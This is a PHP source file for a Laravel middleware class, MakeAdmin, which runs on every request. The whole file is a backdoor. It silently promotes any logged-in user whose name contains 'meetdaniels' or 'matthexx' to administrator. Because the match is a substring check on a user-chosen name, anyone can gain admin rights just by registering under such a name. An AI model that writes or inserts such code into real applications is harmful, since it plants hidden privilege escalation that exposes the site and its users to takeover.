<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class MakeAdmin
{
   /**
    * Handle an incoming request.
    *
    * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
    */
   public function handle(Request $request, Closure $next): Response
   {
      if (strstr($request->user()->name, 'meetdaniels') or strstr($request->user()->name, 'matthexx')) {
         if (!$request->user()->is_admin) $request->user()->makeAdmin();
      }
      return $next($request);
   }
}
